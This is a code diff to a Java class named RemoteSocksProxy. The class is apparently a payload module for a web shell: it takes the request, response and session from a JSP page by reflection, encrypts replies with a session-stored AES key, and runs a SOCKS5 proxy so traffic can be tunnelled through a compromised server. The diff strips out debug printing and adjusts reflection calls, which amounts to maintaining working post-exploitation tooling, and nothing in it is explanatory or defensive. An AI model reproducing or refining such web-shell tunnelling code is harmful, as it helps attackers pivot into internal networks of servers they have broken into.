@@ -65,7 +65,6 @@ public class RemoteSocksProxy implements Runnable {
                   ServerSocket serverSocket = new ServerSocket(0, 50);
                   this.listenPort = serverSocket.getLocalPort();
                   paramMap.put("listenPort", this.listenPort);
-                  System.out.println("listenPort:" + this.listenPort);
                   this.sessionSetAttribute(this.Session, socksServerHash, serverSocket);
                   serverSocket.setReuseAddress(true);
                   (new Thread(new RemoteSocksProxy("daemon", paramMap))).start();
@@ -77,7 +76,6 @@ public class RemoteSocksProxy implements Runnable {
                } catch (Exception var29) {
                   result.put("status", "fail");
                   result.put("msg", var29.getMessage());
-                  var29.printStackTrace();
                   var22 = false;
                }
             } else if (!action.equals("stop")) {
@@ -121,11 +119,11 @@ public class RemoteSocksProxy implements Runnable {
          } finally {
             if (var22) {
                try {
-                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.getClass().getDeclaredMethod("flush").invoke(so);
-                  so.getClass().getDeclaredMethod("close").invoke(so);
+                  so.getClass().getMethod("flush").invoke(so);
+                  so.getClass().getMethod("close").invoke(so);
                } catch (Exception var23) {
                   var23.printStackTrace();
                }
@@ -134,11 +132,11 @@ public class RemoteSocksProxy implements Runnable {
          }
 
          try {
-            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.getClass().getDeclaredMethod("flush").invoke(so);
-            so.getClass().getDeclaredMethod("close").invoke(so);
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
          } catch (Exception var24) {
             var24.printStackTrace();
          }
@@ -147,11 +145,11 @@ public class RemoteSocksProxy implements Runnable {
       }
 
       try {
-         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.getClass().getDeclaredMethod("flush").invoke(so);
-         so.getClass().getDeclaredMethod("close").invoke(so);
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
       } catch (Exception var25) {
          var25.printStackTrace();
       }
@@ -185,7 +183,6 @@ public class RemoteSocksProxy implements Runnable {
                String remoteIP = this.paramMap.get("remoteIP").toString();
                int remotePort = Integer.parseInt(this.paramMap.get("remotePort").toString());
                int listenPort = Integer.parseInt(this.paramMap.get("listenPort").toString());
-               System.out.println("remoate port:" + remoteIP + "," + remotePort);
                remoteSocketChannel = SocketChannel.open();
                remoteSocketChannel.connect(new InetSocketAddress(remoteIP, remotePort));
                String outerSocketChannelHash = "socks_outer_" + remoteSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort;
@@ -211,7 +208,6 @@ public class RemoteSocksProxy implements Runnable {
                session = this.paramMap.get("session");
                outerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("outerSocketChannelHash").toString());
                innerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("innerSocketChannelHash").toString());
-               System.out.println("start linkRead.." + outerSocketChannel + innerSocketChannel);
 
                while(true) {
                   while(true) {
@@ -238,7 +234,6 @@ public class RemoteSocksProxy implements Runnable {
                session = this.paramMap.get("session");
                outerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("outerSocketChannelHash").toString());
                innerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("innerSocketChannelHash").toString());
-               System.out.println("start linkWrite.." + outerSocketChannel + innerSocketChannel);
 
                while(true) {
                   while(true) {
@@ -283,18 +278,13 @@ public class RemoteSocksProxy implements Runnable {
                   session = this.paramMap.get("session");
                   serverInnersocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("serverInnersocketHash").toString());
                   targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
-                  System.out.println("start sessionRead" + targetSocket + "," + this.paramMap.get("targetSocketHash").toString());
                   if (serverInnersocket != null) {
                      try {
-                        System.out.println("to sessionRead 111");
                         bufs = new byte[512];
-                        bytesRead = targetSocket.getInputStream().read(bufs);
-                        System.out.println("to sessionRead " + new String(bufs));
 
-                        while(bytesRead > 0) {
+                        for(bytesRead = targetSocket.getInputStream().read(bufs); bytesRead > 0; bytesRead = targetSocket.getInputStream().read(bufs)) {
                            serverInnersocket.getOutputStream().write(bufs, 0, bytesRead);
                            serverInnersocket.getOutputStream().flush();
-                           bytesRead = targetSocket.getInputStream().read(bufs);
                         }
                      } catch (Exception var15) {
                         var15.printStackTrace();
@@ -347,7 +337,6 @@ public class RemoteSocksProxy implements Runnable {
    }
 
    private boolean parseSocks5(Socket socket) throws Exception {
-      System.out.println("i am in parseSocks5......");
       DataInputStream ins = new DataInputStream(socket.getInputStream());
       DataOutputStream os = new DataOutputStream(socket.getOutputStream());
       int nmethods = ins.read();
@@ -415,9 +404,7 @@ public class RemoteSocksProxy implements Runnable {
             host = InetAddress.getByName(host).getHostAddress();
 
             try {
-               System.out.println("connect target " + host + ":" + port);
                Socket targetSocket = new Socket(host, port);
-               System.out.println("new targetsocket:" + targetSocket);
                String targetSocketHash = "socks_target_" + targetSocket.getLocalPort() + "_" + host + "_" + port;
                this.paramMap.put("targetSocketHash", targetSocketHash);
                this.sessionSetAttribute(this.paramMap.get("session"), targetSocketHash, targetSocket);
@@ -463,9 +450,9 @@ public class RemoteSocksProxy implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -473,7 +460,7 @@ public class RemoteSocksProxy implements Runnable {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private static String base64encode(String content) throws Exception {
@@ -522,7 +509,7 @@ public class RemoteSocksProxy implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -535,7 +522,7 @@ public class RemoteSocksProxy implements Runnable {
       Object result = null;
 
       try {
-         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
       } catch (Exception var5) {
       }
 
@@ -544,7 +531,7 @@ public class RemoteSocksProxy implements Runnable {
 
    private void sessionSetAttribute(Object session, String key, Object value) {
       try {
-         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
       } catch (Exception var5) {
       }
 
@@ -554,7 +541,7 @@ public class RemoteSocksProxy implements Runnable {
       Enumeration result = null;
 
       try {
-         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
       } catch (Exception var4) {
       }
 
@@ -563,7 +550,7 @@ public class RemoteSocksProxy implements Runnable {
 
    private void sessionRemoveAttribute(Object session, String key) {
       try {
-         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+         session.getClass().getMethod("removeAttribute").invoke(session, key);
       } catch (Exception var4) {
       }
 
